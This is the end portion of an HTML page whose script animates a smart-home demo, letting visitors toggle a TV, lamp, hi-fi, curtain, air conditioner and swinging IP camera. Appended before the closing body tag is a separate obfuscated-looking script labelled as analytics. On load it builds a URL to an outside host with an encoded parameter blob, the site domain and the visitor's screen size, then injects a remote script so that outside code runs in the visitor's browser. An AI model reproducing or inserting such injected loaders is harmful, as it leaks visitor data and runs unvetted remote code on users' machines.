						// var $videoBody = '<video id="theVideo" width="280" height="160" poster="video/'+$source+'_poster.jpg" loop autoplay><source src="video/showroom/'+$source+'.mp4" type="video/mp4"><source src="video/'+$source+'.ogv" type="video/ogg"><source src="video/'+$source+'.webm" type="video/webm"></video>';

						} else {
							var $videoBody = '<iframe width="280" height="150" src="https://www.youtube.com/embed/videoseries?list=PLDLZtS0atun8lapSjQJ-q8zylU2M3XQ2r&autoplay=1&showinfo=0&controls=0" frameborder="0"></iframe>';
						}

						if(!$('.tvVideo').data('status')){
							$('.transContent').prepend('<div class="tvVideo">'+ $videoBody +'</div>');
							$('.tvVideo').data('status', $source).css('left', $tvVideoX).css('top', $tvVideoY).stop().fadeIn($aTime);
						}else{
							$('.tvVideo').fadeOut($aTime/2, function(){
								$('.tvVideo').data('status',$source).empty().append($videoBody).stop().fadeIn($aTime/2);
							})
						}
					}else if($source=='off' && $('.tvVideo')){
						$('.tvVideo').stop().fadeOut($aTime,function(){
							$('.tvVideo').remove();
						})
					}
				};
				function checkLoop($intLoop){
					if($intLoop && ($currElements[0][3][1]==1 || window.ipCamSwing /*$currElements[0][6][1]==1*/)){
						window.loopInt = setInterval(function(){
							if(!$intPaused) drawCurrElement();
						},1000/$frameRate);
					}else if(!$intLoop){
						clearInterval(window.loopInt);
					}
				};
				function getHifiFrame(){
					// 5 frames per second
					return Math.floor((new Date()).getUTCMilliseconds()/200);
				};
				function getIpCamFrame(){
					var framePerSec =24;
					var $tmp = Math.floor(Number(new Date()));
					if(window.ipCamCurrFrame==undefined){
						window.ipCamCurrFrame = 0;
						window.ipCamTimeStamp = $tmp;
					}else if($tmp-window.ipCamTimeStamp>(1000/framePerSec)){
						if($currElements[0][6][1]==2){
							// if playing
							window.ipCamCurrFrame ++;
						}else if($currElements[0][6][1]==1){
							//if turning off
							if(window.ipCamCurrFrame<=24 || (window.ipCamCurrFrame>48 && window.ipCamCurrFrame<=72)){
								//if swinging to left  or right, swing back fast
								window.ipCamCurrFrame -= 3;
								if(window.ipCamCurrFrame<0){
									window.ipCamCurrFrame=0;
								}else if(window.ipCamCurrFrame>24 && window.ipCamCurrFrame<48){
									window.ipCamCurrFrame=48;
								}
							}else{
								//if swinging back, swing back fast
								window.ipCamCurrFrame += 3;
								if(window.ipCamCurrFrame>48 && window.ipCamCurrFrame<=72){
									window.ipCamCurrFrame=48;
								}else if(window.ipCamCurrFrame>=96){
									window.ipCamCurrFrame=96;
								}
							}
						}
						if(window.ipCamCurrFrame>96){
							window.ipCamCurrFrame=0;
						}
						window.ipCamTimeStamp = $tmp;
					}
					if(!window.ipCamSwing){
						//stop swing
						window.ipCamCurrFrame = 0;
						return 0;
					}else if(window.ipCamCurrFrame==0 || window.ipCamCurrFrame==48 || window.ipCamCurrFrame==96){
						//center point
						if($currElements[0][6][1]!=2) window.ipCamSwing = false;
						return 0;
					}else if(window.ipCamCurrFrame<=24){
						//swing to left
						return window.ipCamCurrFrame;
					}else if(window.ipCamCurrFrame<=48){
						//swing back from left
						return 24- (window.ipCamCurrFrame-24)
					}else if(window.ipCamCurrFrame<=72){
						//swing to right
						return 24+ window.ipCamCurrFrame-48;
					}else{
						//swing back from right
						return 24+ 24 - (window.ipCamCurrFrame-72)
					}
				}
				/* end of draw canvas */
				/* ipad pannel */
				if($currStage==0){
					$('#functionsBtn').addClass('active');
				}else{
					$('#scenesBtn').addClass('active');
					$('#scenesBtn > ul > li').eq($currStage-1).addClass('active');
				};
				/* /* functions pannel */
				$('#functionsBtn > div').click(function(){
					if(!$btnFreeze && !$(this).parent().hasClass('active')){
						$(this).parent().addClass('active');
						$('#scenesBtn').removeClass('active');
						if($currStage != 0){
							$btnFreeze = true;
							$stage0Selected={
								/*features : status,*/
								"tv" : ($stages[$currStage][1].tv=='off') ? 'off' : $stage0Tv,
								"lamp" : $stages[$currStage][1].lamp,
								"hifi" : $stages[$currStage][1].hifi,
								"curtain" : $stages[$currStage][1].curtain,
								"airCon" :  $stages[$currStage][1].airCon,
								"ipCam" : $stages[$currStage][1].ipCam,
								"music" : $stages[$currStage][1].music
							};
							functionsBtnClass();
							animateStage(0);
						}
					}
				});

				functionsBtnClass();
				$('#tvBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldTvStatus = {'alpha': (($stage0Selected.tv!='off') ? 1 : 0)};
						var $newTvStatus = {
							'status': $stage0Selected.tv=='off' ? $stage0Tv : 'off',
							'alpha': (($stage0Selected.tv!='off')? 0 : 1)
						};

						//-/tv label for stage 0 --
						$currElements[3][1][1] = $stage0Tv;

						//tv video --
						addVideo($newTvStatus.status);

						var $totalFrame = $frameRate*$animateTime/2;
						var $currFrame=0;

						var $tvInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $currFrame/$totalFrame;

								var $alpha = $oldTvStatus.alpha+($newTvStatus.alpha-$oldTvStatus.alpha)*$progress; //alpha

								//-//tv label for stage 0 --
								$currElements[3][0] = $alpha;
								drawCurrElement();

								if($currFrame>=$totalFrame){
									clearInterval($tvInt);
									$currElements[3][0] = $newTvStatus.alpha;
									$currElements[3][1][1] = $newTvStatus.status;
									$stage0Selected.tv = $newTvStatus.status;
									$currStageFnStatus.tv = $newTvStatus.status;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});
				$('#lampBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldLampStatus = {'alpha': ($stage0Selected.lamp ? 1 : 0)};
						var $newLampStatus = {
							'status': !$stage0Selected.lamp,
							'alpha': ($stage0Selected.lamp ? 0 : 1)
						};

						//-/lamp label for stage 0 --
						$currElements[4][1][1] = true;

						var $totalFrame = $frameRate*$animateTime/2;
						var $currFrame=0;

						var $lampInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $currFrame/$totalFrame;

								var $alpha = $oldLampStatus.alpha+($newLampStatus.alpha-$oldLampStatus.alpha)*$progress; //alpha
								//lamp on/off image for stage 0 --
								$currElements[0][2][1] = $alpha;
								//-//lamp label for stage 0 --
								$currElements[4][0] = $alpha;
								drawCurrElement();

								if($currFrame>=$totalFrame){
									clearInterval($lampInt);
									$currElements[4][0] = $newLampStatus.alpha;
									$currElements[4][1][1] = $newLampStatus.status;
									$stage0Selected.lamp = $newLampStatus.status;
									$currStageFnStatus.lamp = $newLampStatus.status;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});
				$('#hifiBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldHifiStatus = {'alpha': ($stage0Selected.hifi ? 1 : 0)};
						var $newHifiStatus = {
							'status': !$stage0Selected.hifi,
							'alpha': ($stage0Selected.hifi ? 0 : 1)
						};

						//-/hifi label for stage 0 --
						$currElements[5][1][1] = true;

						var $totalFrame = $frameRate*$animateTime/2;
						var $currFrame=0;

						var $hifiInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $currFrame/$totalFrame;

								var $alpha = $oldHifiStatus.alpha+($newHifiStatus.alpha-$oldHifiStatus.alpha)*$progress; //alpha
								//hifi image--
								$currElements[0][3][1] = $alpha;
								//-//hifi label for stage 0 --
								$currElements[5][0] = $alpha;
								drawCurrElement();

								if($currFrame>=$totalFrame){
									clearInterval($hifiInt);
									$currElements[5][0] = $newHifiStatus.alpha;
									$currElements[5][1][1] = $newHifiStatus.status;
									$stage0Selected.hifi = $newHifiStatus.status;
									$currStageFnStatus.hifi = $newHifiStatus.status;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});
				$('#curtainBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldCurtainStatus = $stage0Selected.curtain;
						var $newCurtainStatus = Math.ceil($stage0Selected.curtain) == 1 ? 0 : 1;

						//-//curtain label for stage 0 --
						$currElements[6][1][1] = true;

						var $totalFrame = $frameRate*$animateTime;
						var $currFrame = 0;
						var $curtainInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $currFrame/$totalFrame;

								var $Status = $oldCurtainStatus+($newCurtainStatus-$oldCurtainStatus)*$progress;

								$currElements[0][4][2] = $Status;  //curtain image --
								$currElements[6][0] = $Status; //-//curtain label for stage 0 --
								drawCurrElement();

								if($currFrame >= $totalFrame){
									clearInterval($curtainInt);
									$stage0Selected.curtain =$newCurtainStatus;
									$currStageFnStatus.curtain =$newCurtainStatus;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});
				$('#airConBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldAirConStatus = {
							'alpha': ($stage0Selected.airCon ? 1 : 0)
						};
						var $newAirConStatus = {
							'status': !$stage0Selected.airCon,
							'alpha': ($stage0Selected.airCon ? 0 : 1)
						};

						//-//aircon label for stage 0 --
						$currElements[7][1][1] = true;

						var $totalFrame = $frameRate*$animateTime;
						var $currFrame=0;
						var $airConInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $oldAirConStatus.alpha+($newAirConStatus.alpha-$oldAirConStatus.alpha)*($currFrame/$totalFrame);
								//airCon on/off image for stage 0 --
								$currElements[0][5][1] = $progress;
								//-//aircon label for stage 0 --
								$currElements[7][0] = $progress;

								drawCurrElement();

								if($currFrame>=$totalFrame){
									clearInterval($airConInt);
									$currElements[7][0] = $newAirConStatus.alpha;
									$currElements[7][1][1] = $newAirConStatus.status;
									$stage0Selected.airCon = $newAirConStatus.status;
									$currStageFnStatus.airCon = $newAirConStatus.status;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});
				$('#ipCamBtn').click(function(){
					if(!$btnFreeze){
						$btnFreeze = true;
						$(this).toggleClass('active');
						checkLoop(false);//kill hifi loop

						var $oldIpCamStatus = {'alpha': ($stage0Selected.ipCam ? 1 : 0)};
						var $newIpCamStatus = {
							'status': !$stage0Selected.ipCam,
							'alpha': ($stage0Selected.ipCam ? 0 : 1)
						};

						$currElements[0][6][1] = $newIpCamStatus.status? 2 : 1; //ipCam image for stage 0 --
						if(!window.ipCamSwing && $newIpCamStatus.status){
							window.ipCamSwing = true;
						}

						//-//ipCam label for stage 0 --
						$currElements[8][1][1] = true;

						var $totalFrame = $frameRate*$animateTime/2;
						var $currFrame=0;

						var $ipCamInt = setInterval(function(){
							if(!$intPaused){
								$currFrame++;
								var $progress = $currFrame/$totalFrame;

								//-//aircon label for stage 0 --
								$currElements[8][0] = $oldIpCamStatus.alpha+($newIpCamStatus.alpha-$oldIpCamStatus.alpha)*$progress;
								drawCurrElement();

								if($currFrame>=$totalFrame){
									clearInterval($ipCamInt);
									$currElements[8][0] = $newIpCamStatus.alpha;
									$currElements[8][1][1] = $newIpCamStatus.status;
									$stage0Selected.ipCam = $newIpCamStatus.status;
									$currStageFnStatus.ipCam = $newIpCamStatus.status;

									$btnFreeze = false;
									checkLoop(true);//hifi image loop--
								}
							}
						},1000/$frameRate);
					}
				});

				function functionsBtnClass(){
					$('#functionsBtn .pannel li').removeClass('active');
					if($stage0Selected.tv!='off') $('#tvBtn').addClass('active');
					var $functionsBtnList = ['lamp', 'hifi', 'curtain', 'airCon', 'ipCam'];
					for($a=0; $a<$functionsBtnList.length; $a++){
						if($stage0Selected[$functionsBtnList[$a]]) $('#'+$functionsBtnList[$a]+'Btn').addClass('active');
					}
				}
				/* /* end of functions pannel */
				$('#scenesBtn > div').click(function(){
					if(!$btnFreeze && !$(this).parent().hasClass('active')){
						$('#functionsBtn').removeClass('active');
						$(this).parent().addClass('active');
						/*// auto go to bright stage
						$btnFreeze = true;
						animateStage(1);*/
					}
				});
				/* /* scenes pannel */
				$('#scenesBtn > ul > li').click(function(){
					if(!$btnFreeze && $currStage!= $(this).index()+1){
						$btnFreeze = true;
						animateStage($(this).index()+1);
					}
				});
				/* /* end of scenes pannel */
				/* end of ipad pannel */
			});
		</script>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKmdB3I%2bW38ZtHZoROISg2McjONRt0lKT5YDWyVOsP6%2buNjlESDkHS4UOslqePd6IN231LB%2be9jhN1Ez5l1npj9pwaRJvUfCkWFxtDb60d3nzHKNucnIFFcY68mbhG1DgqnU4UHhnBWSov%2b%2bOYa2BUmmdTUMSlG%2bPlfHarZcFj2h0OL0%2bm2jw%2bVFKhv97URQkACohXbfHySs2GPyRGTa7PyMC0emmqgrcsnfb94daTACMIASZ%2bJDuTo6cr8KEicw7Y1NHwFYKoH%2b8%2bDxNZqVU3xb2%2fXSQYkCSB2nvMV1wGZUH0BoLCuhbw3RNx8ZcAvg0jGa%2bf9x%2bM7uaoTZ6OE6cHmfHwCVCUjn0nAfT6mgmcnvnTsUqaJFM2R7NsjaUoyU3lIyXqdAH1H9s6zZ4r%2bBoWwj9o9NXpbqGhDshUvgh%2fZ4VrGkg4h67%2b9e55HXPrhkTdT3fu0AMOM5dzBiMHceSmRU5xz2X%2fklhJpFxPKT%2bcd5wxC7ijhlV6EAGZaUgFPiXcNGQ476tyIXgG6F7TziB%2bk5%2fYZxAToE9c4EUUOegQZlX2%2fuxePUdfWd6%2bX30QFhUE6bqPMYRbutc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
